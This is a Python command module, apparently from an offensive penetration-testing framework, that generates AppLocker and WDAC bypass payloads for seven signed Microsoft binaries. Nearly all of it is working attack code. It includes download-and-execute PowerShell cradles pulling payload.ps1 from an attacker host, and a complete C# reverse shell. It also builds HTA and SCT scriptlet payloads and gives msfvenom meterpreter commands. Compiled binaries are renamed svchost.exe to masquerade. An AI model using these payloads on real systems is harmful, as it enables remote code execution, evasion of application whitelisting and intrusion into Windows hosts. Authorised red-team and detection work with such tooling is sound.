"""AppLocker and WDAC bypass command set.

Generates payloads and bypass scripts for 7 signed Microsoft binaries
that are commonly allowed through AppLocker and Windows Defender
Application Control policies.
"""

from __future__ import annotations

import os

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    print_error,
    print_msg,
    print_succ,
)

APP_LOCKER_CATEGORY = "04. Evasion & Bypass"

INSTALLUTIL_CS = """using System;
using System.Diagnostics;
class Program {{
    static void Main() {{
        Process.Start("powershell", "-ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')");
    }}
}}"""

MSBUILD_XML = """<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Exec Command="powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&quot;http://{lhost}:{lport}/payload.ps1&quot;)"/>
  </Target>
</Project>"""

REGSVCS_CS = """using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class Bypass : ServicedComponent {{
    public Bypass() {{
        Process.Start("powershell", "-ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\\"http://{lhost}:{lport}/payload.ps1\\")");
    }}
}}"""

CSC_CS = """using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
class P {{
    static void Main() {{
        using(var c = new TcpClient("{lhost}", {lport}))
        using(var s = c.GetStream()) {{
            byte[] b = new byte[8192];
            while(true) {{
                int n = s.Read(b, 0, b.Length);
                if(n == 0) break;
                var r = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo {{
                    FileName = "cmd.exe",
                    Arguments = "/c " + Encoding.ASCII.GetString(b, 0, n),
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }});
                string o = r.StandardOutput.ReadToEnd() + r.StandardError.ReadToEnd();
                byte[] rb = Encoding.ASCII.GetBytes(o);
                s.Write(rb, 0, rb.Length);
                s.Flush();
            }}
        }}
    }}
}}"""

MSHTA_HTA = """<html>
<head>
<script language="VBScript">
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')", 0, False
window.close
</script>
</head>
</html>"""

RUNDLL32_SCT = """<?XML version="1.0"?>
<scriptlet>
<registration progid="Bypass" classid="{{F0001111-0000-0000-0000-000000000000}}">
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell");
r.Run("powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/payload.ps1')", 0, false);
]]>
</script>
</registration>
</scriptlet>"""


class AppLockerBypassCommandSet(LazyOwnCommandSet):
    """AppLocker and WDAC bypass payload generators."""

    phase = "exploit"
    category = APP_LOCKER_CATEGORY

    def _get_lh(self):
        return self.params.get("lhost", ""), int(self.params.get("lport", "4444"))

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_installutil(self, line=""):
        """Generate an InstallUtil.exe AppLocker bypass payload.

        Usage: applocker_installutil

        Compiles a .NET assembly that downloads and executes a PowerShell
        payload, then provides the InstallUtil.exe command for execution.
        The assembly uses the required Installer class pattern.

        MITRE: T1218.004
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)
        cs_path = "sessions/installutil_bypass.cs"
        exe_path = "sessions/installutil_bypass.exe"

        with open(cs_path, "w") as f:
            f.write(INSTALLUTIL_CS.format(lhost=lhost, lport=lport))

        print_msg("Compile with: mcs sessions/installutil_bypass.cs -out:sessions/installutil_bypass.exe")
        print_msg("Or on target using csc.exe:")
        print_msg(
            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\svchost.exe /target:exe {cs_path}"
        )
        print_msg("")
        print_succ("Execute on target:")
        print_msg(
            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {exe_path}"
        )
        print_msg("  Or with alternate path: /U C:\\Users\\Public\\svchost.exe")
        print_msg(f"Payload saved to {cs_path}")

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_msbuild(self, line=""):
        """Generate an MSBuild.exe AppLocker bypass payload.

        Usage: applocker_msbuild

        Creates a .xml MSBuild project file that executes PowerShell.
        MSBuild.exe is signed and commonly allowed through WDAC policies.

        MITRE: T1127.001
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)
        xml_path = "sessions/msbuild_bypass.xml"

        with open(xml_path, "w") as f:
            f.write(MSBUILD_XML.format(lhost=lhost, lport=lport))

        print_succ(f"Payload saved to {xml_path}")
        print_succ("Execute on target:")
        print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {xml_path}")
        print_msg(f"  Or x86: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe {xml_path}")

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_regsvcs(self, line=""):
        """Generate a Regsvcs.exe/Regasm.exe AppLocker bypass payload.

        Usage: applocker_regsvcs

        Compiles a .NET assembly inheriting ServicedComponent and
        generates the Regsvcs.exe command to execute the payload.

        MITRE: T1218.009
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)
        cs_path = "sessions/regsvcs_bypass.cs"
        dll_path = "sessions/regsvcs_bypass.dll"

        with open(cs_path, "w") as f:
            f.write(REGSVCS_CS.format(lhost=lhost, lport=lport))

        print_msg(
            "Compile with: mcs -r:System.EnterpriseServices.dll sessions/regsvcs_bypass.cs -out:sessions/regsvcs_bypass.dll"
        )
        print_msg("Or on target:")
        print_msg(
            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:{dll_path} /target:library {cs_path}"
        )
        print_msg("")
        print_succ("Execute on target:")
        print_msg(f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe /U {dll_path}")
        print_msg(f"  Or regasm: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U {dll_path}")
        print_msg(f"Payload saved to {cs_path}")

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_csc(self, line=""):
        """Generate a csc.exe compile-and-execute AppLocker bypass.

        Usage: applocker_csc

        Creates a pure C# reverse shell source file that can be compiled
        with csc.exe (a signed Microsoft binary commonly allowed).
        No external dependencies except .NET Framework.

        MITRE: T1027.004
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)
        cs_path = "sessions/csc_revshell.cs"

        with open(cs_path, "w") as f:
            f.write(CSC_CS.format(lhost=lhost, lport=lport))

        print_succ(f"Payload saved to {cs_path}")
        print_succ("Execute on target:")
        print_msg(
            f"  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\svchost.exe /target:exe {cs_path}"
        )
        print_msg("  Then run: C:\\Users\\Public\\svchost.exe")
        print_msg(f"Start listener: nc -lvnp {lport}")

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_mshta(self, line=""):
        """Generate an mshta.exe AppLocker bypass payload.

        Usage: applocker_mshta

        Creates an HTA file that executes PowerShell via mshta.exe
        (a signed Microsoft binary). Can be served via HTTP or run
        from local disk.

        MITRE: T1218.005
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)
        hta_path = "sessions/mshta_payload.hta"

        with open(hta_path, "w") as f:
            f.write(MSHTA_HTA.format(lhost=lhost, lport=lport))

        print_succ(f"Payload saved to {hta_path}")
        print_succ("Serve and execute:")
        print_msg(f"  python3 -m http.server {lport}")
        print_msg(f"  mshta.exe http://{lhost}:{lport}/mshta_payload.hta")
        print_msg(f"  Or local: mshta.exe {hta_path}")

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_rundll32(self, line=""):
        """Generate a rundll32.exe AppLocker bypass via SCT scriptlet.

        Usage: applocker_rundll32

        Creates a .sct scriptlet file that executes JavaScript via
        rundll32.exe (a signed Microsoft binary). Can be served via
        HTTP or run from local disk.

        MITRE: T1218.011
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)
        sct_path = "sessions/rundll32_bypass.sct"

        with open(sct_path, "w") as f:
            f.write(RUNDLL32_SCT.format(lhost=lhost, lport=lport))

        print_succ(f"Payload saved to {sct_path}")
        print_succ("Serve and execute:")
        print_msg(f"  python3 -m http.server {lport}")
        print_msg(f"  rundll32.exe javascript:\"GetObject('script:http://{lhost}:{lport}/rundll32_bypass.sct')\"")
        print_msg(f"  Or: regsvr32 /s /n /u /i:http://{lhost}:{lport}/rundll32_bypass.sct scrobj.dll")

    @cmd2.with_category(APP_LOCKER_CATEGORY)
    def do_applocker_presentation(self, line=""):
        """Generate a PresentationHost.exe AppLocker bypass reference.

        Usage: applocker_presentation

        Provides commands to generate and deploy an XBAP payload.
        PresentationHost.exe is a signed WPF host that can execute
        XAML Browser Applications.

        MITRE: T1218
        """
        lhost, lport = self._get_lh()
        if not lhost:
            print_error("Set lhost: assign lhost <ip>")
            return

        os.makedirs("sessions", exist_ok=True)

        print_msg("PresentationHost.exe bypass via .xbap files:")
        print_msg(
            f"  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f xbap > sessions/payload.xbap"
        )
        print_msg(f"  python3 -m http.server {lport}")
        print_msg(f"  C:\\Windows\\System32\\PresentationHost.exe http://{lhost}:{lport}/payload.xbap")
        print_msg("")
        print_msg("Alternative — direct command execution via XBAP:")
        print_msg(
            "  msfvenom -p windows/x64/exec CMD='powershell -ep bypass -c YourCommand' -f xbap > sessions/cmd.xbap"
        )


__all__ = ["AppLockerBypassCommandSet"]
